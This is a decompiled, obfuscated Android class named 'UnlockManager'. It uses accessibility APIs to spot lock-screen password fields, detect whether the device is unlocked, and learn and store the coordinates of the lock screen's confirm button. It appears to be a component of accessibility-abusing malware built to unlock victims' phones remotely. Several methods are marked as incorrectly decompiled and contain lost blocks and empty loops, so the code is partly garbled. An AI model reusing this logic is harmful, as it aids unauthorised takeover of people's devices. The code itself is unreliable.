package p000;

import android.content.SharedPreferences;
import android.graphics.Rect;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.Pair;
import kotlin.collections.builders.SetBuilder;
import kotlin.jvm.internal.Ref$BooleanRef;
import kotlin.jvm.internal.Ref$FloatRef;
import kotlin.jvm.internal.Ref$ObjectRef;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class x81 {

    /* renamed from: a3 */
    public static final w81 f61037a3 = new w81(null);

    /* renamed from: a0 */
    public final dqtvuisjd f61038a0;

    /* renamed from: a1 */
    public final dqtvuisjd f61039a1;

    /* renamed from: a2 */
    public final SharedPreferences f61040a2;

    public x81(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2, z50 z50Var) {
        t60.m214695b6(z50Var, "inputController");
        this.f61038a0 = dqtvuisjdVar;
        this.f61039a1 = dqtvuisjdVar2;
        SharedPreferences sharedPreferences = dqtvuisjdVar2.getSharedPreferences(f61037a3.getPREFS_NAME(), 0);
        t60.m214694b5(sharedPreferences, "context.getSharedPrefere…ME, Context.MODE_PRIVATE)");
        this.f61040a2 = sharedPreferences;
    }

    /* renamed from: a0 */
    public static final void m215128a0(float f, float f2, Ref$FloatRef ref$FloatRef, Ref$ObjectRef ref$ObjectRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        float f3;
        float f4;
        Ref$FloatRef ref$FloatRef2;
        Ref$ObjectRef ref$ObjectRef2;
        String string;
        String string2;
        if (i > 15) {
            return;
        }
        try {
            if (accessibilityNodeInfo.isClickable()) {
                accessibilityNodeInfo.getBoundsInScreen(new Rect());
                float fCenterX = r0.centerX() - f;
                float fCenterY = r0.centerY() - f2;
                float fSqrt = (float) Math.sqrt((fCenterY * fCenterY) + (fCenterX * fCenterX));
                if (fSqrt < 100.0f && fSqrt < ref$FloatRef.f57623a0) {
                    CharSequence text = accessibilityNodeInfo.getText();
                    String str = "";
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                    if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                        str = string2;
                    }
                    List<String> list = dh0.f55776c6;
                    if (list == null || !list.isEmpty()) {
                        for (String str2 : list) {
                            if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                                break;
                            }
                        }
                    }
                    ref$ObjectRef.f57626a0 = accessibilityNodeInfo;
                    ref$FloatRef.f57623a0 = fSqrt;
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            int i2 = 0;
            while (i2 < childCount) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    f3 = f;
                    f4 = f2;
                    ref$FloatRef2 = ref$FloatRef;
                    ref$ObjectRef2 = ref$ObjectRef;
                    m215128a0(f3, f4, ref$FloatRef2, ref$ObjectRef2, child, i + 1);
                    if (child != ref$ObjectRef2.f57626a0) {
                        child.recycle();
                    }
                } else {
                    f3 = f;
                    f4 = f2;
                    ref$FloatRef2 = ref$FloatRef;
                    ref$ObjectRef2 = ref$ObjectRef;
                }
                i2++;
                f = f3;
                f2 = f4;
                ref$FloatRef = ref$FloatRef2;
                ref$ObjectRef = ref$ObjectRef2;
            }
        } catch (Exception e) {
            t60.m214705c6("UnlockManager", "查找最近按钮失败", e);
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:40:0x0076, code lost:
    
        if (r8.isPassword() != false) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:41:0x0078, code lost:
    
        r7.f57622a0 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x007a, code lost:
    
        return;
     */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final void m215129a3(Ref$BooleanRef ref$BooleanRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        String string2;
        String string3;
        if (i > 30 || ref$BooleanRef.f57622a0) {
            return;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        String str = "";
        if (className == null || (string3 = className.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string3.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text == null || (string = text.toString()) == null) {
            string = "";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
            str = string2;
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "edittext", false)) {
            List<String> list = dh0.f55772c2;
            if (list == null || !list.isEmpty()) {
                for (String str2 : list) {
                    if (AbstractC0779a1.m213652a5(string, str2, true) || AbstractC0779a1.m213652a5(str, str2, true)) {
                        break;
                    }
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m215129a3(ref$BooleanRef, child, i + 1);
                child.recycle();
            }
        }
    }

    /* renamed from: a4 */
    public static final void m215130a4(Ref$BooleanRef ref$BooleanRef, AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        String string2;
        if (i > 30 || ref$BooleanRef.f57622a0) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String lowerCase2 = "";
        if (text == null || (string2 = text.toString()) == null) {
            lowerCase = "";
        } else {
            lowerCase = string2.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && (string = contentDescription.toString()) != null) {
            lowerCase2 = string.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        }
        jl0 jl0Var = new jl0(8);
        ArrayList arrayList = (ArrayList) jl0Var.f57345a0;
        jl0Var.m213323a4(dh0.m212602a1().toArray(new String[0]));
        jl0Var.m213323a4(dh0.f55774c4.toArray(new String[0]));
        jl0Var.m213321a1("→");
        jl0Var.m213321a1("✓");
        jl0Var.m213321a1("√");
        jl0Var.m213321a1("⏎");
        jl0Var.m213321a1("↵");
        jl0Var.m213321a1("✔");
        jl0Var.m213321a1("send");
        jl0Var.m213321a1("search");
        jl0Var.m213321a1("return");
        jl0Var.m213321a1("newline");
        jl0Var.m213321a1("enter key");
        List<String> listM213306g5 = AbstractC0716jf.m213306g5(arrayList.toArray(new String[arrayList.size()]));
        if (listM213306g5 == null || !listM213306g5.isEmpty()) {
            for (String str : listM213306g5) {
                if (AbstractC0779a1.m213652a5(lowerCase, str, false) || AbstractC0779a1.m213652a5(lowerCase2, str, false)) {
                    ref$BooleanRef.f57622a0 = true;
                    return;
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m215130a4(ref$BooleanRef, child, i + 1);
                child.recycle();
            }
        }
    }

    /* renamed from: a1 */
    public final Pair m215131a1() {
        try {
            DisplayMetrics displayMetrics = this.f61039a1.getResources().getDisplayMetrics();
            return new Pair(Integer.valueOf(displayMetrics.widthPixels), Integer.valueOf(displayMetrics.heightPixels));
        } catch (Exception e) {
            t60.m214705c6("UnlockManager", "获取屏幕尺寸失败", e);
            return new Pair(1080, 2160);
        }
    }

    /* renamed from: a2 */
    public final Pair m215132a2() {
        SharedPreferences sharedPreferences = this.f61040a2;
        try {
            float f = sharedPreferences.getFloat("learned_confirm_x", -1.0f);
            float f2 = sharedPreferences.getFloat("learned_confirm_y", -1.0f);
            float f3 = sharedPreferences.getFloat("learned_confirm_weight", 0.0f);
            if (f > 0.0f && f2 > 0.0f && f3 > 0.0f) {
                Pair pairM215131a1 = m215131a1();
                if (m215135a7(f, f2, ((Number) pairM215131a1.f57556a0).intValue(), ((Number) pairM215131a1.f57557a1).intValue(), "", "")) {
                    return new Pair(Float.valueOf(f), Float.valueOf(f2));
                }
                t60.m214726f4("UnlockManager", "🚫 学习到的坐标验证失败，清除无效坐标: (" + f + ", " + f2 + ")");
                try {
                    SharedPreferences.Editor editorEdit = sharedPreferences.edit();
                    editorEdit.remove("learned_confirm_x");
                    editorEdit.remove("learned_confirm_y");
                    editorEdit.remove("learned_confirm_weight");
                    editorEdit.remove("learned_confirm_type");
                    editorEdit.apply();
                    return null;
                } catch (Exception e) {
                    t60.m214705c6("UnlockManager", "清除学习坐标失败", e);
                    return null;
                }
            }
            t60.m214726f4("UnlockManager", "🧠 ❌ 无效的学习坐标数据: x=" + f + ", y=" + f2 + ", weight=" + f3);
            return null;
        } catch (Exception e2) {
            t60.m214705c6("UnlockManager", "获取学习坐标失败", e2);
            return null;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:12:0x002c  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x001f A[EDGE_INSN: B:8:0x001f->B:38:0x01a5 BREAK  A[LOOP:1: B:20:0x0162->B:44:?]] */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m215133a5(String str, String str2) {
        String string;
        CharSequence packageName;
        t60.m214695b6(str, "text");
        if (str.length() == 1) {
            char cCharAt = str.charAt(0);
            if ((!Character.isLetterOrDigit(cCharAt) || cCharAt >= 12288) && !AbstractC0779a1.m213653a6(".,?!'\"-()@;:/&%+=*# ⌫⇧", cCharAt)) {
                SetBuilder setBuilder = new SetBuilder();
                setBuilder.addAll(AbstractC0716jf.m213306g5("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ".", ",", "?", "!", "'", "\"", "-", "(", ")", "@", ";", ":", "/", "&", "%", "+", "=", "*", "#"));
                setBuilder.add("⌫");
                setBuilder.add("DEL");
                setBuilder.add("⇧");
                setBuilder.add(" ");
                setBuilder.add("符");
                setBuilder.addAll(dh0.f55777c7);
                setBuilder.addAll(dh0.f55780d0);
                setBuilder.addAll(dh0.f55776c6);
                SetBuilder setBuilderM213503a3 = kg1.m213503a3(setBuilder);
                ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(setBuilderM213503a3));
                Iterator it = setBuilderM213503a3.iterator();
                while (((tc0) it).hasNext()) {
                    String lowerCase = ((String) ((tc0) it).next()).toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    arrayList.add(lowerCase);
                }
                String lowerCase2 = str.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (arrayList.contains(lowerCase2)) {
                    break;
                }
                ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55777c7, dh0.f55780d0), dh0.f55776c6), dh0.f55816g6);
                int size = arrayListM213298i5.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayListM213298i5.get(i);
                    i++;
                    if (AbstractC0779a1.m213652a5(str2, (String) obj, true)) {
                        break;
                        break;
                    }
                }
                if (str2.equalsIgnoreCase("Enter")) {
                    AccessibilityNodeInfo rootInActiveWindow = this.f61038a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                        string = "";
                    }
                    if (AbstractC0779a1.m213652a5(string, "systemui", true) || AbstractC0779a1.m213652a5(string, "lockscreen", true)) {
                    }
                }
                return false;
            }
        }
        return true;
    }

    /* JADX WARN: Removed duplicated region for block: B:53:0x00a0  */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m215134a6() {
        String lowerCase;
        boolean z;
        boolean z2;
        boolean z3;
        String string;
        boolean z4 = true;
        AccessibilityNodeInfo rootInActiveWindow = null;
        try {
            try {
                rootInActiveWindow = this.f61038a0.getRootInActiveWindow();
            } catch (Exception e) {
                t60.m214705c6("UnlockManager", "检测解锁状态失败", e);
                t60.m214726f4("UnlockManager", "🔍 解锁检测异常，保守认为解锁成功");
                if (rootInActiveWindow != null) {
                }
            }
            if (rootInActiveWindow != null) {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string.toLowerCase(Locale.ROOT);
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                }
                try {
                    Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
                    m215129a3(ref$BooleanRef, rootInActiveWindow, 0);
                    z = ref$BooleanRef.f57622a0;
                } catch (Exception e2) {
                    t60.m214705c6("UnlockManager", "检查密码输入框失败", e2);
                    z = false;
                }
                try {
                    Ref$BooleanRef ref$BooleanRef2 = new Ref$BooleanRef();
                    m215130a4(ref$BooleanRef2, rootInActiveWindow, 0);
                    z2 = ref$BooleanRef2.f57622a0;
                } catch (Exception e3) {
                    t60.m214705c6("UnlockManager", "检查解锁元素失败", e3);
                    z2 = false;
                }
                boolean zM213652a5 = AbstractC0779a1.m213652a5(lowerCase, "systemui", false);
                if (zM213652a5 && !z && !z2) {
                    try {
                        rootInActiveWindow.recycle();
                    } catch (Exception unused) {
                    }
                    return true;
                }
                if (!zM213652a5 || (!z && !z2)) {
                    boolean z5 = !zM213652a5 || AbstractC0779a1.m213652a5(lowerCase, "launcher", false) || AbstractC0779a1.m213652a5(lowerCase, "home", false) || AbstractC0779a1.m213652a5(lowerCase, "desktop", false);
                    if (AbstractC0779a1.m213652a5(lowerCase, "systemui", false) || AbstractC0779a1.m213652a5(lowerCase, "android", false)) {
                        z3 = false;
                        if (!z5 && !z3) {
                            z4 = false;
                        }
                        try {
                            rootInActiveWindow.recycle();
                        } catch (Exception unused2) {
                        }
                    } else {
                        if (lowerCase.length() > 0) {
                            z3 = true;
                        }
                        if (!z5) {
                            z4 = false;
                        }
                        rootInActiveWindow.recycle();
                    }
                    return z4;
                }
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused3) {
                }
            }
            return false;
        } catch (Throwable th) {
            if (rootInActiveWindow != null) {
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused4) {
                }
            }
            throw th;
        }
    }

    /* renamed from: a7 */
    public final boolean m215135a7(float f, float f2, int i, int i2, String str, String str2) {
        t60.m214695b6(str, "buttonText");
        try {
            for (String str3 : (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55774c4), dh0.f55780d0), AbstractC0716jf.m213306g5("→", "✓", "✔", "发送", "Send", "搜索", "Search", "返回", "Return", "换行", "newline", "回车", "enter key", "确认键", "enter", "confirm", "submit", "ok", "done"))).toArray(new String[0])) {
                if (AbstractC0779a1.m213652a5(str2, str3, true) || AbstractC0779a1.m213652a5(str, str3, true)) {
                    break;
                }
            }
        } catch (Exception e) {
            e = e;
        }
        try {
            if (m215133a5(str, str2)) {
                t60.m214726f4("UnlockManager", "🚫 [验证失败] 坐标(" + f + ", " + f2 + ")对应键盘按键，拒绝记录: 文本='" + str + "', 描述='" + str2 + "'");
                return false;
            }
            int i3 = i2 + 100;
            if (f >= 0.0f && f2 >= 0.0f) {
                float f3 = i;
                if (f <= f3 && f2 <= i3) {
                    float f4 = i2;
                    float f5 = f4 * 0.8f;
                    if (f2 < f5) {
                        t60.m214726f4("UnlockManager", "🚫 [验证失败] 坐标(" + f + ", " + f2 + ")位置太高，不像确认按钮: Y需要>" + f5);
                        return false;
                    }
                    float f6 = 0.2f * f3;
                    float f7 = f3 * 0.8f;
                    float f8 = f4 * 0.45f;
                    if (f > f6 && f < f7 && f2 > f8 && f2 < f5 && str.length() == 1) {
                        for (int i4 = 0; i4 < str.length(); i4++) {
                            if (Character.isDigit(str.charAt(i4))) {
                            }
                        }
                        t60.m214726f4("UnlockManager", "🚫 [验证失败] 坐标(" + f + ", " + f2 + ")在数字键盘区域且为单个数字，拒绝: '" + str + "'");
                        return false;
                    }
                    if (f < f7 && str.length() <= 2) {
                        t60.m214726f4("UnlockManager", "🚫 [验证失败] 坐标(" + f + ", " + f2 + ")太偏左且文本简短，可能是数字键: '" + str + "' (X需要>" + f7 + ")");
                        return false;
                    }
                    return true;
                }
            }
            t60.m214726f4("UnlockManager", "🚫 [验证失败] 坐标(" + f + ", " + f2 + ")超出扩展屏幕范围: " + i + "x" + i3);
            return false;
        } catch (Exception e2) {
            e = e2;
            t60.m214705c6("UnlockManager", "验证确认按钮坐标失败", e);
            return false;
        }
    }

    /* renamed from: a8 */
    public final void m215136a8(float f, float f2, String str, float f3, int i, int i2, String str2, String str3) {
        SharedPreferences sharedPreferences = this.f61040a2;
        t60.m214695b6(str, "type");
        try {
            if (!m215135a7(f, f2, i, i2, str2, str3)) {
                t60.m214726f4("UnlockManager", "🚫 拒绝记录无效的确认按钮坐标: (" + f + ", " + f2 + ")");
                return;
            }
            float f4 = sharedPreferences.getFloat("learned_confirm_weight", 0.0f);
            boolean zM213652a5 = AbstractC0779a1.m213652a5(str, "manual", true);
            if (f3 <= f4 && f4 != 0.0f && !zM213652a5) {
                return;
            }
            SharedPreferences.Editor editorEdit = sharedPreferences.edit();
            editorEdit.putFloat("learned_confirm_x", f);
            editorEdit.putFloat("learned_confirm_y", f2);
            editorEdit.putFloat("learned_confirm_weight", f3);
            editorEdit.putString("learned_confirm_type", str);
            editorEdit.apply();
        } catch (Exception e) {
            t60.m214705c6("UnlockManager", "记录确认按钮坐标失败", e);
        }
    }
}
